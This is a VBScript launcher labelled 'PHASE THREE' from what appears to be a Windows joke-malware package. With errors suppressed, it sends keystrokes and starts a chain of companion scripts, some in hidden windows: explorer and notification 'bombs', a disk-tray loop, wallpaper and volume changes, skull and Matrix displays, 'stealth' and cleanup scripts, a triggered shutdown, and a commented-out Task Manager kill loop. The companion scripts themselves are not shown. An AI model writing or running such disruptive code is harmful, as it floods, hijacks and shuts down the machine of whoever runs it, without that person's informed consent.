set shell = createobject("wscript.shell")
set fso = wscript.createobject("Scripting.FileSystemObject")
on error resume next


'PHASE THREE
'-----------
wscript.sleep 100
shell.sendkeys "(% ) (M)"
wscript.sleep 10
shell.sendkeys "{LEFT}"
shell.run "explorer.exe"
shell.run "Choo-Choo.vbs"
wscript.sleep 4000
shell.run "DiskTrayLoop.vbs"
shell.run "ExplorerBomb.vbs"
shell.run "NotificationBOMB.bat", 0
wscript.sleep 7500
'shell.run "TaskMgrKillLoop.bat", 0
shell.run "GetRandomWallpaper.bat", 0
shell.run "Disco.vbs"
wscript.sleep 100
shell.run "BrowserActivate.vbs"
shell.run "PlaySOUND.vbs"
shell.run "Matrix.bat"

shell.run "error.bat"
shell.run "VOLUP.vbs"
wscript.sleep 2500
shell.run "Trigger-Shutdown.bat", 0
shell.run "stealth.bat", 0
shell.run "Matrix.bat"
wscript.sleep 2000
shell.run "CleanupVD.bat", 0
wscript.sleep 5500
shell.run "NotificationBOMB.bat", 0
shell.run "JustForSafety.vbs"
shell.run "Matrix.bat"
shell.run "error.bat"

wscript.sleep 1500
shell.sendkeys " "
shell.run "skull.bat"
wscript.sleep 1000
shell.sendkeys " "
shell.run "skull.bat"
wscript.sleep 1000
shell.sendkeys " "
shell.run "skullp2.bat"
wscript.sleep 1500
shell.sendkeys " "
shell.run "skullp2.bat"
shell.run "Giygas.bat"
shell.run "skullp2.bat"
wscript.sleep 12000
shell.run "Sweeper.vbs"
If Not fso.FileExists("Trigger-Shutdown.bat") then
shell.run "Pranked.bat", 0
End If
shell.run "JustForSafety.vbs"
'-----------
' END

wscript.quit

' Original Creation Date: 12/5/2019 11:22 AM '